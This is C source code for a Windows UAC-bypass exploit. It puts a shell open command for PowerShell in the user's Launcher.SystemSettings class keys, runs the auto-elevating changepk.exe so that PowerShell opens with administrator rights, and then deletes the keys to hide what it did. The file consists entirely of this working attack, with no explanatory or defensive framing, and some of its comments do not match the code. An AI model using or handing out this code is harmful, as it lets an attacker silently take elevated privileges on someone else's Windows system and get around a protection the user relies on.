#include <Windows.h>
#include <strsafe.h>

// global handle
HKEY regKey = NULL;

BOOL CreateShellOpenCommandRegKey(WCHAR* key, WCHAR* value)
{
    // declare and init variables
    INT valueLength = 0;

    // measure the value string length
    if (S_OK != StringCbLengthW(value, MAX_PATH, &valueLength))
    {
        return FALSE;
    }

    // create the registry key
    if (ERROR_SUCCESS != RegCreateKey(HKEY_CURRENT_USER, L"Software\\Classes\\Launcher.SystemSettings\\Shell\\Open\\Command", &regKey))
    {
        return FALSE;
    }

    // create the registry value
    if (ERROR_SUCCESS != RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Classes\\Launcher.SystemSettings\\Shell\\Open\\Command", 0, KEY_ALL_ACCESS, &regKey))
    {
        return FALSE;
    }

    // create the key value
    if (ERROR_SUCCESS != RegSetValueEx(regKey, key, 0, REG_SZ, (LPBYTE)value, valueLength))
    {
        return FALSE;
    }

    return TRUE;
}

BOOL DeleteShellOpenCommandRegKey()
{
    // delete the registry key
    if (ERROR_SUCCESS != RegDeleteKey(HKEY_CURRENT_USER, L"Software\\Classes\\Launcher.SystemSettings\\Shell\\Open\\Command"))
    {
        return FALSE;
    }

    return TRUE;
}

INT main()
{
    // declare and init variables
    PVOID pWow64Redirection = NULL;

    // make a decision about which exploit to use
    if(TRUE != Wow64DisableWow64FsRedirection(&pWow64Redirection))
    {
        return -1;
    }

    // lay down first registry key
    if(TRUE != CreateShellOpenCommandRegKey(L"DelegateExecute", L""))
    {
        return -2;
    }

    // lay down second registry key
    if(TRUE != CreateShellOpenCommandRegKey(NULL, L"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"))
    {
        return -3;
    }

    // force no redirection, aka access to native 32bit system
    if(TRUE != Wow64DisableWow64FsRedirection(&pWow64Redirection))
    {
        return -4;
    }

    // kick off changepk.exe, invoking cmd.exe, ignoring returned HINSTANCE
    ShellExecuteW(NULL, L"runas", L"C:\\Windows\\System32\\changepk.exe", 0, 0, SW_SHOWNORMAL);

    // re-enable wow64 bit redirection
    if(TRUE != Wow64RevertWow64FsRedirection(pWow64Redirection))
    {
        return -5;
    }

    // cleanup the registry keys we laid down
    if (TRUE != DeleteShellOpenCommandRegKey())
    {
        return -6;
    }
    
    // close key handle
    if(ERROR_SUCCESS != RegCloseKey(regKey))
    {
        return -7;
    }

    // sleep for 5 seconds to give powershell some time to launch
    return 0;
}



